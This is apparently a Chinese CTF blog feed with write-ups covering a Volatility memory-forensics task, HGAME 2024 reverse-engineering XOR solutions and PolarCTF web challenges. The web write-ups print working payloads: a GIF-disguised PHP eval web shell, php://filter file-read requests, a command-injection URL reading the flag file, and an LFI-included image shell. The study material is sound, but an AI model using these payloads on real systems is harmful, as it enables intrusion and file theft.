yuren@https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;ch=&amp;tn=baidu&amp;bar=&amp;wd=flag%7BY0v_c@n_g3t_th3_i3hi5t0ry%7D&amp;fenlei=256&amp;oq=flag%7BY0v_c@n_g3t_th3_i3hi5t0ry%7D&amp;rsv_pq=ba856c22001a9d03&amp;rsv_t=e07bOheHtncUh6j5xy4va2UDFdWbP9cbFSqaGpk%2FPX%2Fbo4VdjYVGzCvA8XU&amp;rqlang=cn</span><br><span class="line">Last modified: 2024-02-02 05:44:15 UTC+0000</span><br><span class="line">Last accessed: 2024-02-02 05:44:15 UTC+0000</span><br><span class="line">File Offset: 0x280, Data Offset: 0x0, Data Length: 0x184</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 systeminfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Date/Time (UTC) Type    Summary Source</span><br><span class="line">2024-02-02 06:47:30 UTC+0000    Image: DateTime</span><br><span class="line">2024-02-02 01:47:09 UTC+0000    Registry: LastWrite     VVHATI5Y0VRNAM3 ComputerName | SYSTEM\ControlSet001\Control\ComputerName\ComputerName</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     -       TimeZoneKeyName | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-01 10:54:09     Registry: LastWrite             InstallDate | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     4294966816      ActiveTimeBias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:43 UTC+0000    Registry: LastWrite     VVhati5y0vrnam3 Hostname | SYSTEM\ControlSet001\services\Tcpip\Parameters</span><br><span class="line">2024-02-01 10:54:09 UTC+0000    Registry: LastWrite     Service Pack 1  CSDVersion | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     None    DisableAutoDaylightTimeSet | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:35 UTC+0000    Registry: LastWrite     VVHATI5Y0VRNAM3 LastComputerName | SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability</span><br><span class="line">2024-02-02 03:32:01 UTC+0000    Registry: LastWrite     \Device\HarddiskVolume1 SystemPartition | SYSTEM\Setup</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     0       StandardBias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line">2024-02-02 06:44:43 UTC+0000    Registry: LastWrite             Domain | SYSTEM\ControlSet001\services\Tcpip\Parameters</span><br><span class="line">2024-02-01 10:54:39 UTC+0000    Registry: LastWrite             ShutdownTime | SYSTEM\ControlSet001\Control\Windows</span><br><span class="line">2024-02-01 10:54:09 UTC+0000    Registry: LastWrite     Windows 7 Enterprise    ProductName | SOFTWARE\Microsoft\Windows NT\CurrentVersion</span><br><span class="line">2024-02-02 02:21:01 UTC+0000    Registry: LastWrite     AMD64   PROCESSOR_ARCHITECTURE | SYSTEM\ControlSet001\Control\Session Manager\Environment</span><br><span class="line">2024-02-01 10:54:00 UTC+0000    Registry: LastWrite     4294966816      Bias | SYSTEM\ControlSet001\Control\TimeZoneInformation</span><br><span class="line"> LastComputerNameå°±æ˜¯äº†</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> å­¦å–è¯å’¯ - æœºå¯†æ–‡ä»¶</span><br><span class="line">  python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 filescan | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 dumpfiles -Q 0x000000001e742dd0 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">DataSectionObject 0x1e742dd0   None   \Device\HarddiskVolume1\Users\yuren\Desktop\æœºå¯†æ–‡ä»¶.docx</span><br><span class="line">SharedCacheMap 0x1e742dd0   None   \Device\HarddiskVolume1\Users\yuren\Desktop\æœºå¯†æ–‡ä»¶.docx</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line">AUTHORS.txt    contrib      distorm                            LEGAL.txt    MANIFEST.in     pycrypto-2.7a1.tar.gz  README.txt  tools                volatility-foo-master      wenjian</span><br><span class="line">build          CREDITS.txt  file.None.0xfffffa80075fc010.dat   LICENSE.txt  PKG-INFO        pyinstaller            resources   volatility           volatility-foo-master.zip</span><br><span class="line">CHANGELOG.txt  dist         file.None.0xfffffa8007eaba90.vacb  Makefile     pycrypto-2.7a1  pyinstaller.spec       setup.py    volatility.egg-info  vol.py</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># file file.None.0xfffffa80075fc010.dat</span></span><br><span class="line">file.None.0xfffffa80075fc010.dat: Microsoft Word 2007+</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># file file.None.0xfffffa8007eaba90.vacb</span></span><br><span class="line">file.None.0xfffffa8007eaba90.vacb: Microsoft Word 2007+</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/volatility]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ”¹docx å³å¯</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-WEEK-1-éƒ¨åˆ†wp</title>
      <link href="/2024/01/30/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/01/30/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130100622281.png" alt="image-20240130100622281"></p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><h5 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a><strong>ezIDA</strong></h5><p>ä¸‹è½½ç¨‹åºç›´æ¥ï¼Œè®°äº‹æœ¬å³é”®æ‰“å¼€å°±å¯ä»¥äº†ï¼Œ</p><h5 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a><strong>ezASM</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34</span><br><span class="line">    flag db 33 dup(0)</span><br><span class="line">    format db &quot;plz input your flag: &quot;, 0</span><br><span class="line">    success db &quot;Congratulations!&quot;, 0</span><br><span class="line">    failure db &quot;Sry, plz try again&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; Print prompt</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, format</span><br><span class="line">    mov edx, 20</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Read user input</span><br><span class="line">    mov eax, 3</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov ecx, flag</span><br><span class="line">    mov edx, 33</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Check flag</span><br><span class="line">    xor esi, esi</span><br><span class="line">check_flag:</span><br><span class="line">    mov al, byte [flag + esi]</span><br><span class="line">    xor al, 0x22</span><br><span class="line">    cmp al, byte [c + esi]</span><br><span class="line">    jne failure_check</span><br><span class="line"></span><br><span class="line">    inc esi</span><br><span class="line">    cmp esi, 33</span><br><span class="line">    jne check_flag</span><br><span class="line"></span><br><span class="line">    ; Print success message</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, success</span><br><span class="line">    mov edx, 14</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov eax, 1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">failure_check:</span><br><span class="line">    ; Print failure message</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, failure</span><br><span class="line">    mov edx, 18</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov eax, 1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆï¼Ÿæ±‡ç¼–çœ‹ä¸æ‡‚ï¼Ÿï¼Œç›´æ¥äº¤ç»™chatgpt</p><p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130100835357.png" alt="image-20240130100835357"></p><p>gptç»™å‡ºäº†å¼‚æˆ–äº†0x22 é‚£ä¹ˆå°±ç®€å•äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34&quot;</span></span><br><span class="line">a = a.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)^<span class="number">0x22</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a><strong>ezUPX</strong></h5><p>upxçš„å£³ï¼Œéœ€è¦upxè§£ä¸‹å£³<br><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130104400304.png" alt="image-20240130104400304"></p><p>.\upx.exe -d .\ezUPX.exe</p><p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130104421860.png" alt="image-20240130104421860"></p><p>è¿™é‡Œè¿›è¡Œäº†äº¦æˆ–æ“ä½œï¼Œç­‰äºword_1400022A0<br>æ‹‰ä¸€ä¸‹word_1400022A0çš„å€¼ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">word_1400022A0=[</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0x13</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x6D</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>, <span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x5E</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x67</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x32</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(word_1400022A0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word_1400022A0)):</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>((word_1400022A0[i]^<span class="number">0x32</span>))),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a><strong>ezPYC</strong></h5><p>å¬è¯´é™„ä»¶ç»™é”™äº†ï¼Œæ›´æ–°äº†åï¼Œåˆåšä¸€ä¸‹<br>ç›´æ¥å·¥å…·è§£å‡ºæ¥pycï¼Œåœ¨çº¿çš„å·¥å…·ï¼Œpycè§£æˆpyæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> i ,char <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char^c[i % <span class="number">4</span>]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿˜åŸä¸€ä¸‹å³å¯ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfwebåˆ·é¢˜è®°å½•2</title>
      <link href="/2024/01/16/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>/2024/01/16/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h5><p>æ–‡ä»¶ä¸Šä¼ ï¼Œéšä¾¿ç©¿ä¸€ä¸ªä¸œè¥¿å‘ç°éœ€è¦ä¼ gifï¼Œæ”¹ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF89A&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>å³å¯</p><h5 id="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿ"><a href="#è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿ" class="headerlink" title="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿ"></a>è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿ</h5><p>æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«<br>éšæ„ä¼ ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä¸€ä¸‹å³å¯</p><h5 id="ä»£ç å®¡è®¡1"><a href="#ä»£ç å®¡è®¡1" class="headerlink" title="ä»£ç å®¡è®¡1"></a>ä»£ç å®¡è®¡1</h5><p>ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$sys</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;|flag|&quot;</span>, <span class="variable">$xsx</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;flag is no here!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$xsx</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xsx&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$sys</span>(<span class="variable">$xsx</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çœ‹åˆ°new $a($b)æ ¼å¼çš„å­—æ ·ã€‚è¯´æ˜è¿™æ˜¯ä¸€é“phpåŸç”Ÿç±»åˆ©ç”¨çš„é¢˜ç›®ã€‚</p><p>è¿™é“é¢˜æ˜¯æ–‡ä»¶è¯»å–ç±»ï¼šSplFileObjectã€‚<br>â€˜SplFileObjectä¸­çš„<code>toString0ï¼ˆï¼‰é­”æœ¯æ–¹æ³•åªæœ‰åœ¨å°è¯•å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶æ‰ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ é€šå¸¸ï¼Œè¿™æ˜¯åœ¨ä½¿ç”¨</code>echo<code>æˆ–</code>print<code>å‡½æ•°æ—¶å‘ç”Ÿçš„ï¼Œæˆ–è€…åœ¨å°†å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶å‘ç”Ÿã€‚ä½†æ˜¯ï¼Œ SplFileObjectä¸æ˜¯ä¸€ä¸ªç›´æ¥æ”¯æŒ</code>__toString()`çš„ç±»ã€‚<br>SplFileObjectç±»ï¼Œåªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œå¦‚æœæƒ³è¦å…¨éƒ¨è¯»å–å°±éœ€è¦ç”¨åˆ°foreachå‡½æ•°ï¼Œä½†è‹¥<br>ä¸­æ²¡æœ‰ç»™å‡ºforeachå‡½æ•°çš„è¯ï¼Œå°±è¦ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚<br>ä¾‹å¦‚ï¼šï¼Ÿa=SplFileObject&amp;b=php:/filter/read=convert.base64-encode/resource=flag</p><p><code>http://46fd8555-f05c-43c4-bffa-6124175427dd.www.polarctf.com:8090/ ?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php</code></p><p><img src="/images/polarctf/image-20240116204301861.png" alt="image-20240116204301861"></p><h5 id="å¹²æ­£åˆ™"><a href="#å¹²æ­£åˆ™" class="headerlink" title="å¹²æ­£åˆ™"></a>å¹²æ­£åˆ™</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @parse_str(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag\.php/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;don&#x27;t show flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> .= shell_exec(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;å…¶å®å¾ˆç®€å•ï¼&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œè¦ä¼ å‚idï¼Œidç»è¿‡parse_strå¤„ç†</p><p>parse_str() å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚æœæ²¡æœ‰array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ </p><p>è¯­æ³•ï¼šparse_str(string,array)</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ²¡æœ‰array,é‚£ä¹ˆæˆ‘ä»¬ä¼ <code>a[0]=www.polarctf.com</code>ï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼ša[0]æ˜¯ä¸ªå˜é‡äº†ï¼Œè¿™æ ·å°±ç¬¦åˆæ¡ä»¶äº†ï¼Œ<br>cmdä¼ å‚å°±ç®€å•äº†ï¼Œè¿™é‡ŒæŠŠa[0]çš„ç»™æ‹¼æ¥äº†ï¼Œè¿™é‡Œç›´æ¥ç”¨|å°±å¯ä»¥äº†ï¼Œè¿™æ ·|åé¢çš„å‘½ä»¤å°±å¯ä»¥æ‰§è¡Œäº†<br><code>http://e9c19481-2e55-4e77-9d73-5bf35f99eaeb.www.polarctf.com:8090/?id=a[0]=www.polarctf.com&amp;cmd=asd;cat fl*</code><br>æŸ¥çœ‹æºç å³å¯ã€‚</p><h5 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h5><p>robotsæœ‰ä¸ªfileæ–‡ä»¶ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œ<a href="http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=php://filter/convert.base64-encode/resource=../uploads/upload.php">http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=php://filter/convert.base64-encode/resource=../uploads/upload.php</a><br>lfiè¯»ä¸€ä¸‹uploadï¼Œç™½åå•ã€‚é‚£ä¹ˆé…åˆæ–‡ä»¶åŒ…å«ç›´æ¥å›¾ç‰‡é©¬å³å¯<br><a href="http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=../uploads/images/asdasd.png">http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=../uploads/images/asdasd.png</a><br><img src="/images/polarctf/image-20240117211315535.png" 